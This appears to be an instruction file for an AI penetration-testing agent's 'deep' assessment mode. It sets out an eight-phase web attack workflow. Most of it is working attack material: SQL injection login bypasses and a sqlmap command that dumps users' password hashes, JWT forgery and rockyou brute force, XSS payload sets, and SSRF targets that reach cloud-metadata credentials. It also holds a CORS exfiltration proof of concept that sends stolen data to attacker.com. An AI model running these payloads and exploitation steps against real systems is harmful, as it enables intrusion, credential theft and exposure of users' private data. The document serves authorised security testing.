---
name: deep
description: Exhaustive multi-technique security assessment — advisory 8-phase workflow, UI-driven exploration, mandatory raw HTTP evidence, think-tool-before-every-decision, zero-tolerance false positives, and endpoint coverage enforcement
---

# Deep Testing Mode — Maximum Depth, Zero Misses, Zero False Positives

Deep mode is the most powerful assessment Strix can perform. It is the equivalent of an elite red team spending weeks on a single target. Every endpoint tested. Every parameter probed. Every finding proven with real end-to-end exploitation. Every report contains complete raw HTTP evidence. No shortcuts. No guessing. No false positives. No incomplete passes.

---

## SUPREME RULES — NON-NEGOTIABLE IN DEEP MODE

RULE 1: THINK TOOL IS MANDATORY before every major decision — before reporting any vulnerability, before calling agent_finish, before concluding an endpoint is clean.

RULE 2: RAW HTTP IS MANDATORY — every potential finding must have the COMPLETE raw HTTP request (all headers + full body) AND the COMPLETE raw HTTP response (status + all headers + full body) captured before any report is submitted.

RULE 3: DEEPEN WHERE WARRANTED — after the broad discovery pass, apply advanced-bypass, expert, and validation techniques (Broad Discovery → Advanced Bypass → Expert Techniques → Final Validation) wherever a target's surface warrants them. Finish once the surface is mapped and exhausted, not after a fixed number of passes.

RULE 4: UI FIRST — navigate and interact with every UI element before testing the underlying API.

RULE 5: REAL EXPLOITATION ONLY — no theoretical findings. No scanner-only findings. Every report requires end-to-end exploitation with tangible output.

RULE 6: ENDPOINT CHECKLIST = 100% — the scan CANNOT complete unless /workspace/endpoint_checklist.md shows 100% coverage.

---

## Phase 0: Exhaustive Intelligence & Recon — MANDATORY FIRST

This phase builds the complete attack surface map. NOTHING is tested until Phase 0 is complete and /workspace/recon_report.md is saved.

### Documentation Discovery — Exhaust ALL Known Paths
```bash
# Try ALL documentation paths — record every hit
doc_paths=(
  /robots.txt /sitemap.xml /sitemap_index.xml
  /swagger /swagger-ui /swagger-ui.html /swagger.json /swagger.yaml
  /api-docs /api/docs /api/documentation /docs /documentation
  /openapi.json /openapi.yaml /api/openapi.json /api/openapi.yaml
  /v1/docs /v2/docs /v3/docs /api/v1/docs /api/v2/docs
  /redoc /api/schema /schema.json /api/spec
  /graphql /api/graphql /gql /query /graphiql
  /.well-known/openid-configuration /.well-known/oauth-authorization-server
  /.well-known/jwks.json /auth/keys /api/keys/public
)
for path in "${doc_paths[@]}"; do
  status=$(curl -so /dev/null -w "%{http_code}" "https://target.com${path}")
  if [[ "$status" != "404" ]]; then
    echo "HIT: ${path} → ${status}" | tee -a /workspace/doc_hits.txt
    curl -s "https://target.com${path}" > "/workspace/docs${path//\//_}.json" 2>/dev/null
  fi
done
```

Parse EVERY found API spec: extract all endpoints, parameters, authentication schemes, and business flows. Record every discovered endpoint in /workspace/endpoint_checklist.md immediately.

### JavaScript Bundle Analysis — Deep (MANDATORY)
```bash
# Download ALL JavaScript files
katana -u https://target.com -jc -kf -d 10 -o /workspace/js_urls.txt
wget -q -i /workspace/js_urls.txt -P /workspace/js_files/ --no-clobber

# Beautify and deobfuscate ALL JS files
for f in /workspace/js_files/*.js; do
  js-beautify "$f" > "/workspace/js_deobfuscated/$(basename $f)"
done

# Extract ALL API endpoints from deobfuscated JS
grep -rhoE "['\"`](\/[a-zA-Z0-9_\-\/]{3,})['\"`]" /workspace/js_deobfuscated/ \
  | grep -E "/(api|v[0-9]|rest|graphql|auth|admin|user|account)" \
  | sort -u > /workspace/js_endpoints.txt

# Extract secrets and sensitive data
trufflehog filesystem /workspace/js_files/ --json > /workspace/secrets_found.json
grep -rhoiE "(apikey|api_key|secret|token|password|auth|bearer|private)['\"\s:=]+[A-Za-z0-9\-_=+/]{16,}" \
  /workspace/js_deobfuscated/ | sort -u > /workspace/potential_secrets.txt

# Detect vulnerable libraries
retire --js --jspath /workspace/js_files/ --outputformat json > /workspace/retire_results.json

# Find GraphQL operations embedded in JS
grep -rhoE "(query|mutation|subscription)\s+\w+\s*\{[^}]{0,500}\}" /workspace/js_deobfuscated/ \
  > /workspace/graphql_operations.txt

# Find WebSocket endpoint URLs
grep -rhoE "(ws|wss)://[a-zA-Z0-9\._\-/:?=&]+" /workspace/js_deobfuscated/ | sort -u \
  > /workspace/websocket_endpoints.txt

# Extract NEXT_DATA / env variables leaked into frontend
grep -rhoE "(NEXT_PUBLIC_|REACT_APP_|VITE_)[A-Z_]+=.{0,100}" /workspace/js_deobfuscated/ \
  >> /workspace/potential_secrets.txt
```

### Full Attack Surface Enumeration
```bash
# Subdomain enumeration — exhaustive
subfinder -d target.com -all -recursive -t 100 -o /workspace/subdomains_raw.txt
cat /workspace/subdomains_raw.txt | httpx -title -tech-detect -status-code -follow-redirects \
  -o /workspace/live_subdomains.txt

# Port scanning on all live subdomains — all ports
naabu -iL <(awk '{print $1}' /workspace/live_subdomains.txt) -p - \
  -o /workspace/open_ports.txt

# Comprehensive directory enumeration
ffuf -u https://target.com/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,204,301,302,307,401,403 \
  -fs 0 -t 100 \
  -o /workspace/dirscan.json -of json

# Parameter discovery on all API endpoints
arjun -i /workspace/js_endpoints.txt -t 20 -q -o /workspace/discovered_params.json

# Sensitive file exposure check
sensitive_paths=(
  /.git/config /.git/HEAD /.env /.env.local /.env.production
  /config.json /appsettings.json /web.config /config.php
  /backup.zip /backup.sql /db.sql /dump.sql
  /phpinfo.php /info.php /server-status /server-info /_status
  /admin /wp-admin /wp-login.php /administrator /manage
  /.htaccess /.htpasswd /crossdomain.xml /clientaccesspolicy.xml
)
for path in "${sensitive_paths[@]}"; do
  status=$(curl -so /dev/null -w "%{http_code}" "https://target.com${path}")
  [[ "$status" != "404" ]] && echo "${path}: ${status}" >> /workspace/sensitive_hits.txt
done

# WAF detection
wafw00f https://target.com -o /workspace/waf_result.txt
```

### Build Complete Endpoint Checklist
Create /workspace/endpoint_checklist.md with EVERY discovered endpoint.
Format: `[ ] [METHOD] [PATH] — [type: public/auth/admin/api/upload/ws/gql] — pending`
NEVER begin Phase 1 testing until this checklist is complete.

---

## Phase 1: Pre-Authentication Testing — Complete Coverage

### Mandatory UI Walkthrough First
```
1. Open headless browser → navigate to target home page → take screenshot
2. Identify ALL visible UI elements without login: links, forms, buttons, modals
3. Click every element → observe and screenshot every result
4. Record ALL network requests made via proxy
5. Document every public page, form, and feature
```

### Authentication Attack Surface — Test ALL

**Login Bypass — Exhaustive:**
```python
# SQL injection in all login form fields
login_sqli_payloads = [
    "' OR '1'='1'--",
    "admin'--",
    "' OR 1=1#",
    "admin'/*",
    "') OR ('1'='1",
    "1' OR '1'='1' LIMIT 1--",
    '" OR "1"="1"--',
    "admin'; DROP TABLE users--",  # Detects MySQL error handling
]

# Parameter manipulation
login_param_bypass = [
    "?authenticated=true",
    "?admin=true",
    "?role=admin",
    "?debug=true",
    "?override=1",
]

# Response manipulation: use proxy to change {"success":false} → {"success":true}
# Test 403/401 response body replacement
```

**Registration Flaws:**
```python
# Mass assignment in registration body
mass_assignment_fields = {
    "role": "admin",
    "isAdmin": True,
    "is_admin": True,
    "admin": True,
    "verified": True,
    "emailVerified": True,
    "status": "active",
    "permissions": ["admin", "superuser"],
    "privilege": 9,
    "level": 999,
    "access_level": "super_admin"
}
# Send normal registration + each field above, observe response
```

**Password Reset — All Vectors:**
```python
# Host header injection
headers_to_test = {
    "Host": "attacker.com",
    "X-Forwarded-Host": "attacker.com",
    "X-Host": "attacker.com",
    "X-Forwarded-For": "attacker.com",
    "Forwarded": "host=attacker.com",
}

# Token predictability analysis
# Request 5 tokens, analyze for patterns:
tokens = [request_reset_token() for _ in range(5)]
# Check: are they sequential? Do they share prefixes? Are they UUIDs v1 (time-based)?

# Token reuse test
token = get_reset_token()
use_reset_token(token, "newpassword1")
try_reset_again = use_reset_token(token, "newpassword2")  # Should fail
```

**Rate Limiting — Demonstrate Viability:**
```python
import asyncio, aiohttp
from collections import Counter

async def test_rate_limit_with_lockout_check(url, payload, attempts=500):
    """
    Tests both rate limiting AND account lockout.
    For High-severity reporting: BOTH must be absent.
    """
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json={**payload, "password": f"wrong{i}"}) 
                 for i in range(attempts)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    statuses = [r.status for r in results if hasattr(r, 'status')]
    status_dist = Counter(statuses)
    
    blocked = status_dist.get(429, 0) + status_dist.get(403, 0)
    successful = status_dist.get(200, 0)
    
    print(f"Total attempts: {attempts}")
    print(f"Status distribution: {dict(status_dist)}")
    print(f"Blocked (429/403): {blocked}")
    print(f"Requests processed (200): {successful}")
    
    # High severity ONLY if: no rate limit AND no lockout
    if blocked == 0 and successful >= 400:
        print("HIGH SEVERITY: No rate limiting AND no account lockout — brute force fully viable")
    elif blocked > 0:
        print(f"RATE LIMIT EXISTS: {blocked}/{attempts} blocked — severity is LOW")
    
    return status_dist

asyncio.run(test_rate_limit_with_lockout_check(
    "https://target.com/api/auth/login",
    {"email": "victim@target.com"},
    attempts=500
))
```

**Username/Email Enumeration — Precise Measurement:**
```python
import time, requests

def measure_enumeration(valid_user, invalid_user, endpoint):
    results = {}
    for label, user in [("valid", valid_user), ("invalid", invalid_user)]:
        times = []
        responses = []
        for _ in range(5):  # 5 measurements each
            start = time.time()
            r = requests.post(endpoint, json={"email": user, "password": "wrongpassword"})
            elapsed = time.time() - start
            times.append(elapsed)
            responses.append({
                "status": r.status_code,
                "body": r.text[:200],
                "length": len(r.text),
                "time": elapsed
            })
        results[label] = {
            "avg_time": sum(times)/len(times),
            "messages": [r["body"] for r in responses],
            "statuses": [r["status"] for r in responses]
        }
    
    # Analyze differences
    time_diff = abs(results["valid"]["avg_time"] - results["invalid"]["avg_time"])
    msg_diff = results["valid"]["messages"][0] != results["invalid"]["messages"][0]
    
    print(f"Valid user avg response: {results['valid']['avg_time']:.3f}s")
    print(f"Invalid user avg response: {results['invalid']['avg_time']:.3f}s")
    print(f"Timing difference: {time_diff:.3f}s (>100ms is significant)")
    print(f"Message difference: {msg_diff}")
    print(f"Valid messages: {set(results['valid']['messages'])}")
    print(f"Invalid messages: {set(results['invalid']['messages'])}")
```

---

## Phase 2: Authentication & Multi-User Setup

### Account Creation — UI ONLY (Take Screenshots of Every Step)
```
1. Navigate to /register (or equivalent) in browser
2. Fill in User A details: email=user_a_[timestamp]@mailnull.com, strong password
3. Complete all onboarding (email verification, profile setup)
4. Navigate to /login, log in as User A
5. CAPTURE all cookies, JWT, CSRF tokens from browser DevTools → Network → login response
6. Save ALL captured tokens to /workspace/auth_tokens.md

7. Repeat for User B: email=user_b_[timestamp]@mailnull.com
8. Try admin creation: /admin/register, /admin/signup, default credentials, invite flows
```

### JWT Security Analysis — Complete
```bash
# Decode JWT and analyze header + payload
jwt_tool ${USER_A_TOKEN} --decode

# Test none algorithm (CRITICAL — removes signature requirement)
jwt_tool ${USER_A_TOKEN} -X a
# Expected result if vulnerable: authenticated as admin with forged token

# RS256 to HS256 key confusion
JWKS_URL="https://target.com/.well-known/jwks.json"
PUBLIC_KEY=$(curl -s ${JWKS_URL} | python3 -c "import json,sys,base64; d=json.load(sys.stdin); print(d['keys'][0]['n'])")
jwt_tool ${USER_A_TOKEN} -S hs256 -p "${PUBLIC_KEY}"

# Weak secret brute force
jwt_tool ${USER_A_TOKEN} -C -d /usr/share/wordlists/rockyou.txt

# Claim manipulation
# Decode → modify role/sub/admin claim → re-encode → test
jwt_tool ${USER_A_TOKEN} -T  # Tamper mode
```

### Populate User A's Resources (For IDOR Testing)
As User A, create at least one of each resource type:
- Post/message/note with private content
- Uploaded file
- API key or access token
- Profile data with specific PII
- Any other object the application supports

Record ALL resource IDs to /workspace/user_a_resources.md.

---

## Phase 3: Full Authenticated UI Exploration — HIGHEST PRIORITY

### Exhaustive Interaction Protocol

Use this checklist for every page discovered:
```
For EACH page:
[ ] Take screenshot of page in initial state
[ ] Run: document.querySelectorAll('button,a,[onclick],[ng-click],[v-on],[data-action],[role=button],[role=tab],[role=menuitem],[aria-expanded],[aria-haspopup],[data-toggle],summary')
[ ] Click EVERY clickable element — observe result — take screenshot
[ ] Open EVERY modal, dialog, drawer, tooltip, popover
[ ] Fill EVERY form with valid data → submit → record HTTP request
[ ] Fill EVERY form with invalid data → observe error handling
[ ] Monitor ALL network requests via proxy during each interaction
[ ] Add ALL newly discovered endpoints to /workspace/endpoint_checklist.md
```

### SPA Route & Hidden-Section Discovery — routes with no visible link
`querySelectorAll` only sees the CURRENT DOM. SPAs register routes with NO visible
link (admin views, feature-flagged pages, deep-linked wizard steps). Pull the router
table directly so these are not missed (browser execute_js / view_source):

- Next.js:   window.__NEXT_DATA__ (page, buildId); enumerate /_next/static/ chunks
- React Router: search bundle for  path:"…"  route defs; window.__reactRouterManifest
- Vue Router: $router.getRoutes().map(r=>r.path)
- Angular:  grep bundle for "loadChildren" / "path:" route configs

Then grep the deobfuscated bundle for CLIENT routes, not just API endpoints:
  grep -rhoE "path:\s*['\"][^'\"]+['\"]" /workspace/js_deobfuscated/ | sort -u >> /workspace/ui_surface.md

For every route NOT reachable via a visible link: browser `goto` it directly with
EACH role's session and record the result.

Every link-less route you discover AND every API request it fires when you `goto`
it → add to /workspace/endpoint_checklist.md as well, not only ui_surface.md. The
two ledgers are not interchangeable: ui_surface.md tracks whether a section was
visited; endpoint_checklist.md tracks whether its endpoints were tested. A route is
done only when it is `[x]` in both. Same for each multi-step-form step's endpoint.

### Durable UI-surface ledger — /workspace/ui_surface.md
Mirror endpoint_checklist.md for UI. The instant you SEE a nav item / tab / modal /
route — even if you don't open it yet — record it as `[ ] pending`. Mark `[x]` only
after it's been visited and its requests captured. UI exploration is NOT complete
while any `[ ] pending` section or route remains (same gate spirit as RULE 6).
Multi-step forms: advance each wizard to completion, logging every step's distinct
form + endpoint as its own ledger line.

### State-Changing Actions — Execute ALL That Apply
For every action below, perform it through the UI AND capture the full HTTP request/response:

| Action | What to Capture | IDOR Test After? |
|--------|-----------------|-----------------|
| Create resource | New resource ID + URL | YES — immediately test with User B |
| Edit resource | Edit endpoint + parameters | YES — test with User B's session |
| Delete resource | Delete endpoint + ID | YES — can User B delete User A's items? |
| Send message | Message ID + recipient | YES — can User C read? |
| Upload file | File URL + access path | YES — is URL guessable? |
| Change email | Change endpoint + CSRF check | YES — CSRF PoC |
| Change password | Change endpoint + session invalidation | YES — old sessions still valid? |
| Generate API key | Key ID + token value | YES — key scoping issues? |
| Export data | Export URL + contents | YES — does export include other users' data? |
| Invite user | Invite endpoint + permissions | YES — can you over-privilege the invitee? |
| Make payment | Payment endpoint + amounts | YES — price manipulation? |

### Admin Panel — Systematic Discovery
```bash
admin_paths=(
  /admin /admin/ /administrator /manage /management
  /dashboard/admin /panel /control /cp /backend
  /cms /wp-admin /staff /internal /ops /superadmin
  /root /system /backstage /moderator /support/admin
  /helpdesk /console /portal/admin /api/admin
)
for path in "${admin_paths[@]}"; do
  # Test with User A's session (regular user)
  user_a_status=$(curl -so /dev/null -w "%{http_code}" \
    -H "Cookie: ${USER_A_COOKIE}" "https://target.com${path}")
  echo "${path}: ${user_a_status}" >> /workspace/admin_panel_check.txt
done
```

---

## Phase 4: Multi-User Attack Simulation — IDOR MATRIX

### Build the IDOR Test Matrix

```python
import requests

# Load User A resources and User B session from /workspace files
user_a_resources = load_resources("/workspace/user_a_resources.md")
user_b_cookie = load_auth("/workspace/auth_tokens.md", "user_b")["cookie"]

def test_idor_complete(resource_url, resource_id, user_a_session, user_b_session):
    """
    Complete IDOR test — MUST verify response BODY, not just status code.
    
    REMEMBER: 200 OK from User B is NOT proof of IDOR.
    Proof requires: User B's response body contains User A's ACTUAL private data.
    """
    # Step 1: Get User A's own resource to know what it contains
    user_a_resp = requests.get(
        f"{resource_url}/{resource_id}",
        headers={"Cookie": f"session={user_a_session}"}
    )
    user_a_data = user_a_resp.json()
    
    # Extract unique identifiers from User A's data
    user_a_markers = {
        "email": user_a_data.get("email", ""),
        "username": user_a_data.get("username", ""),
        "name": user_a_data.get("name", ""),
        "private_field": str(user_a_data)[:100]
    }
    
    # Step 2: Try with User B's session
    user_b_resp = requests.get(
        f"{resource_url}/{resource_id}",
        headers={"Cookie": f"session={user_b_session}"}
    )
    
    print(f"\n{'='*60}")
    print(f"IDOR TEST: {resource_url}/{resource_id}")
    print(f"User B HTTP Status: {user_b_resp.status_code}")
    
    if user_b_resp.status_code == 200:
        body = user_b_resp.text
        
        # Step 3: CRITICAL — check if response contains User A's actual data
        for key, value in user_a_markers.items():
            if value and value in body:
                print(f"✅ CONFIRMED IDOR: User B sees User A's {key}: '{value}'")
                print(f"User B Response: {body[:500]}")
                
                # Capture raw HTTP evidence
                print(f"\n[RAW REQUEST - USER B]")
                print(f"GET {resource_url}/{resource_id} HTTP/1.1")
                print(f"Cookie: session={user_b_session[:20]}...")
                print(f"\n[RAW RESPONSE - USER B]")
                print(f"HTTP/1.1 {user_b_resp.status_code} OK")
                for h, v in user_b_resp.headers.items():
                    print(f"{h}: {v}")
                print(f"\n{body[:1000]}")
                return True, user_a_markers, body
        
        print(f"❌ NOT IDOR: User B got 200 but User A's data NOT present in response")
        print(f"User B body: {body[:200]}")
    else:
        print(f"❌ Properly blocked: HTTP {user_b_resp.status_code}")
    
    return False, None, None

# Test ALL HTTP methods for each resource
for resource_id, resource_url in user_a_resources.items():
    for method in ["GET", "PUT", "PATCH", "DELETE"]:
        try:
            r = requests.request(method, f"{resource_url}/{resource_id}",
                headers={"Cookie": f"session={user_b_cookie}",
                         "Content-Type": "application/json"},
                json={"data": "test_modification"})
            print(f"{method} {resource_url}/{resource_id}: {r.status_code}")
        except Exception as e:
            print(f"Error: {e}")
```

---

## Phase 5: Systematic Deep Vulnerability Testing

### SQL Injection — Every Parameter, Every Technique
```bash
# Automated scan on all captured proxy requests
sqlmap -l /workspace/proxy_requests.txt \
  --batch \
  --level=5 \
  --risk=3 \
  --tamper=space2comment,between,randomcase,charunicodeescape \
  --technique=BEUSTQ \
  --dbms=mysql,postgresql,mssql,oracle,sqlite \
  --threads=10 \
  --output-dir=/workspace/sqlmap_results/

# For each confirmed injection point — extract data as proof
sqlmap -u "https://target.com/api/users?id=1" \
  --dbms=mysql \
  --dump-all \
  --batch \
  -D targetdb \
  -T users \
  -C "id,email,password_hash,role"
```

Manual deep testing for WAF-protected endpoints:
```sql
-- MySQL WAF bypass payloads
' /*!OR*/ '1'='1'--+
' /*!UNION*/ /*!SELECT*/ 1,version(),3--+
'||'1'='1
' AND (SELECT SLEEP(5))--+         -- Time-based
' AND 1=0 UNION SELECT NULL,@@version,NULL--+

-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND (SELECT 1 FROM pg_sleep(5))=1--

-- MSSQL  
'; WAITFOR DELAY '0:0:5'--
```

Time-based CONFIRMATION PROTOCOL:
```python
# Time-based SQLi MUST be confirmed 5 times — NEVER report from a single timing
import time, requests, statistics

def confirm_time_based_sqli(url, param, payload, baseline_param):
    results = {"baseline": [], "injected": []}
    
    for _ in range(5):
        # Baseline
        start = time.time()
        requests.get(url, params={param: baseline_param})
        results["baseline"].append(time.time() - start)
        
        # Injected
        start = time.time()
        requests.get(url, params={param: payload})
        results["injected"].append(time.time() - start)
    
    avg_baseline = statistics.mean(results["baseline"])
    avg_injected = statistics.mean(results["injected"])
    
    print(f"Baseline avg: {avg_baseline:.3f}s (all: {[f'{t:.2f}' for t in results['baseline']]})")
    print(f"Injected avg: {avg_injected:.3f}s (all: {[f'{t:.2f}' for t in results['injected']]})")
    print(f"Delay: {avg_injected - avg_baseline:.3f}s")
    
    if avg_injected > avg_baseline + 4.5:  # At least 4.5s delay
        print("✅ TIME-BASED SQLI CONFIRMED (5x average confirms statistical significance)")
        return True
    print("❌ Timing not statistically significant")
    return False
```

### XSS — All 6 Contexts, Browser Execution Mandatory
```python
# Context detection probe
canary = f"xss_probe_{int(time.time())}_\"'></"
# Submit canary to each input, check response for context

# Context-specific payloads
xss_payloads = {
    "html_body": [
        '<img src=x onerror=alert(document.domain)>',
        '<svg onload=alert(document.domain)>',
        '<details open ontoggle=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
    ],
    "attribute_double_quote": [
        '" onmouseover="alert(1)" x="',
        '" autofocus onfocus="alert(1)" x="',
        '" onload="alert(1)" x="',
    ],
    "attribute_single_quote": [
        "' onmouseover='alert(1)' x='",
        "' onfocus='alert(1)' autofocus x='",
    ],
    "js_string_double": [
        '"-alert(document.domain)-"',
        '";alert(document.domain);//',
        '"};alert(document.domain);//',
    ],
    "js_string_single": [
        "'-alert(document.domain)-'",
        "';alert(document.domain);//",
    ],
    "url_context": [
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "css_context": [
        "};alert(1);//",
        "expression(alert(1))",  # IE legacy
    ],
    "svg_context": [
        '<svg><script>alert(1)</script></svg>',
        '<svg><use href="data:image/svg+xml,&lt;svg id=\'x\'&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;#x"/>',
    ]
}

# CSP bypass analysis
def analyze_csp(csp_header):
    """Analyze CSP for bypass vectors"""
    weaknesses = []
    if "unsafe-inline" in csp_header:
        weaknesses.append("unsafe-inline: direct inline script injection")
    if "unsafe-eval" in csp_header:
        weaknesses.append("unsafe-eval: eval()-based XSS")
    if "* " in csp_header or csp_header.endswith("*"):
        weaknesses.append("wildcard: any origin allowed")
    if "data:" in csp_header:
        weaknesses.append("data: URI: allows data: XSS")
    # Check for JSONP-enabled CDNs
    jsonp_cdns = ["googleapis.com", "cloudflare.com", "jsdelivr.net"]
    for cdn in jsonp_cdns:
        if cdn in csp_header:
            weaknesses.append(f"JSONP-enabled CDN: {cdn}")
    if "base-uri" not in csp_header:
        weaknesses.append("Missing base-uri: base tag injection possible")
    return weaknesses
```

BROWSER EXECUTION CONFIRMATION — MANDATORY:
```python
# For every XSS candidate — confirm in headless browser
from playwright.sync_api import sync_playwright

def confirm_xss_execution(url_with_payload):
    """
    Returns True ONLY if the XSS payload executes.
    Captures alert dialog text as proof.
    """
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        
        dialog_triggered = {"value": False, "message": ""}
        
        def handle_dialog(dialog):
            dialog_triggered["value"] = True
            dialog_triggered["message"] = dialog.message
            print(f"✅ XSS CONFIRMED: alert({dialog.message}) executed!")
            dialog.accept()
        
        page.on("dialog", handle_dialog)
        
        try:
            page.goto(url_with_payload, timeout=10000)
            page.wait_for_timeout(3000)  # Wait 3 seconds for execution
        except Exception as e:
            print(f"Navigation error: {e}")
        
        browser.close()
        
        if not dialog_triggered["value"]:
            print(f"❌ XSS NOT CONFIRMED: payload reflected but did NOT execute in browser")
        
        return dialog_triggered["value"], dialog_triggered["message"]
```

### SSRF — Progressive Escalation Required
```python
# SSRF Severity ladder — ALWAYS escalate from DNS to full credential retrieval
ssrf_targets_by_severity = {
    "LOW_INFO (DNS only)": [
        f"http://{interactsh_id}.oast.fun/ssrf-probe",
    ],
    "MEDIUM (internal access)": [
        "http://127.0.0.1/",
        "http://localhost:8080/",
        "http://10.0.0.1/",
        "http://192.168.1.1/",
        "http://[::1]/",
        "http://0x7f000001/",    # 127.0.0.1 hex
        "http://2130706433/",    # 127.0.0.1 decimal
        "http://0177.0.0.1/",    # 127.0.0.1 octal
    ],
    "HIGH_CRITICAL (cloud metadata)": [
        # AWS IMDSv1
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # AWS in GCP-style
        "http://metadata.internal/",
    ],
    "PROTOCOL_ATTACKS": [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "gopher://localhost:6379/_INFO",      # Redis
        "gopher://localhost:9200/_cat/nodes", # Elasticsearch
        "dict://127.0.0.1:6379/info",
        "ftp://127.0.0.1/",
        "sftp://127.0.0.1/",
    ]
}

# For DNS-only: report as LOW/INFORMATIONAL — NEVER Critical/High
# For internal service access: report as MEDIUM
# For cloud credentials: report as HIGH/CRITICAL
```

### CORS — Sensitive Endpoints ONLY (Enforced)
```python
def find_sensitive_cors_targets(authenticated_endpoints, user_cookie):
    """
    STEP 1: Identify which endpoints return sensitive data.
    STEP 2: Only test CORS on those endpoints.
    NEVER test CORS on endpoints that don't return sensitive data.
    """
    sensitive_keywords = [
        "email", "phone", "address", "ssn", "dob", "birthday",
        "payment", "credit_card", "card_number", "cvv", "bank",
        "token", "api_key", "apikey", "secret", "private_key",
        "password", "hash", "salt",
        "message", "inbox", "private",
        "balance", "transaction", "invoice",
        "admin", "role", "permission", "privilege"
    ]
    
    sensitive_endpoints = []
    
    for endpoint in authenticated_endpoints:
        try:
            resp = requests.get(endpoint, 
                headers={"Cookie": user_cookie},
                timeout=10)
            body = resp.text.lower()
            
            found_fields = [kw for kw in sensitive_keywords if kw in body]
            if found_fields:
                sensitive_endpoints.append({
                    "url": endpoint,
                    "sensitive_fields": found_fields,
                    "sample": resp.text[:200]
                })
                print(f"Sensitive endpoint found: {endpoint}")
                print(f"Fields: {found_fields}")
        except Exception as e:
            pass
    
    return sensitive_endpoints

def test_cors_exploitability(endpoint, user_cookie):
    """
    Test CORS only on confirmed sensitive endpoints.
    CORS is ONLY reportable when ALL 3 conditions met.
    """
    origins_to_test = [
        "https://attacker.com",
        "https://evil.attacker.com",
        "null",  # Null origin bypass
        f"https://{target_domain}.attacker.com",  # Subdomain bypass attempt
    ]
    
    for origin in origins_to_test:
        resp = requests.get(
            endpoint,
            headers={
                "Cookie": user_cookie,
                "Origin": origin
            }
        )
        
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
        
        if origin in acao or acao == "*":
            if acac.lower() == "true" or origin == acao:
                print(f"✅ CORS EXPLOITABLE: {endpoint}")
                print(f"   Origin: {origin}")
                print(f"   ACAO: {acao}")
                print(f"   ACAC: {acac}")
                
                # MANDATORY: Build and verify actual exfiltration PoC
                poc = f'''
<!-- CORS Exfiltration PoC — host on attacker.com -->
<script>
fetch("{endpoint}", {{
  method: "GET",
  credentials: "include"
}})
.then(r => r.text())
.then(data => {{
  fetch("https://attacker.com/steal?data=" + encodeURIComponent(data));
  console.log("Exfiltrated:", data);
}});
</script>
'''
                print(f"PoC HTML:\n{poc}")
                return True, origin, acao, acac, poc
    
    return False, None, None, None, None
```

### Business Logic — Race Conditions & State Attacks
```python
import asyncio, aiohttp, time

async def test_race_condition(url, payload, headers, n=20):
    """
    Send N identical requests simultaneously.
    If invariant is violated (balance decremented N times, coupon applied N times) → race condition.
    
    MANDATORY: Record before-state and after-state to demonstrate the invariant violation.
    """
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(
                url,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=30)
            )
            for _ in range(n)
        ]
        
        start = time.time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = time.time() - start
    
    statuses = {}
    responses = []
    for r in results:
        if hasattr(r, 'status'):
            statuses[r.status] = statuses.get(r.status, 0) + 1
    
    print(f"Race condition test: {n} simultaneous requests in {elapsed:.2f}s")
    print(f"Status distribution: {statuses}")
    
    # Multiple 200 responses = potential race condition
    if statuses.get(200, 0) > 1:
        print(f"⚠️ POTENTIAL RACE CONDITION: {statuses[200]}/{n} requests succeeded")
        print("VERIFY: Check the after-state to confirm invariant violation")
    
    return statuses

# Step skipping in multi-step workflows
def test_workflow_bypass(step_urls, final_step_url, session_cookie):
    """
    Test if you can reach the final step without completing intermediate steps.
    Example: Payment flow: step1=cart → step2=shipping → step3=payment → step4=confirm
    Try: jump from step1 directly to step4
    """
    session = requests.Session()
    session.cookies.set("session", session_cookie)
    
    # Start workflow (step 1)
    r1 = session.post(step_urls[0], json={"action": "start"})
    print(f"Step 1: {r1.status_code}")
    
    # Skip to final step directly
    r_final = session.post(final_step_url, json={"action": "confirm"})
    print(f"Final step (skipping {len(step_urls)-1} intermediate steps): {r_final.status_code}")
    
    if r_final.status_code == 200 and "success" in r_final.text.lower():
        print("✅ WORKFLOW BYPASS CONFIRMED: Reached final step without completing prerequisites")
    else:
        print(f"Properly blocked: {r_final.status_code}")
```

---

## Phase 6: Post-Logout Session Security

```python
def test_session_invalidation(user_a_cookie, user_a_jwt, user_a_api_key):
    """
    Test ALL token types after logout.
    CRITICAL: JWTs are stateless — they often remain valid after logout.
    """
    # Step 1: Log out via UI
    logout_resp = requests.post("https://target.com/api/auth/logout",
        headers={"Cookie": user_a_cookie})
    print(f"Logout response: {logout_resp.status_code}")
    
    # Step 2: Test all captured tokens
    endpoints_to_test = [
        "/api/user/profile",
        "/api/messages",
        "/api/user/settings",
    ]
    
    for endpoint in endpoints_to_test:
        # Test cookie
        r1 = requests.get(f"https://target.com{endpoint}",
            headers={"Cookie": user_a_cookie})
        print(f"Cookie after logout → {endpoint}: {r1.status_code} {'(VALID - VULNERABILITY)' if r1.status_code == 200 else '(invalidated)'}")
        
        # Test JWT
        if user_a_jwt:
            r2 = requests.get(f"https://target.com{endpoint}",
                headers={"Authorization": f"Bearer {user_a_jwt}"})
            print(f"JWT after logout → {endpoint}: {r2.status_code} {'(VALID - JWT NOT INVALIDATED)' if r2.status_code == 200 else '(invalidated)'}")
        
        # Test API key
        if user_a_api_key:
            r3 = requests.get(f"https://target.com{endpoint}",
                headers={"X-API-Key": user_a_api_key})
            print(f"API key after logout → {endpoint}: {r3.status_code}")
    
    # Step 3: Change password — test if OLD sessions are invalidated
    # Change password with User A's current session (if still valid)
    # Then test if old session is invalidated
    
    # Step 4: Test concurrent session behavior
    # Log in twice → are both sessions active?
    session1 = login_and_get_cookie()
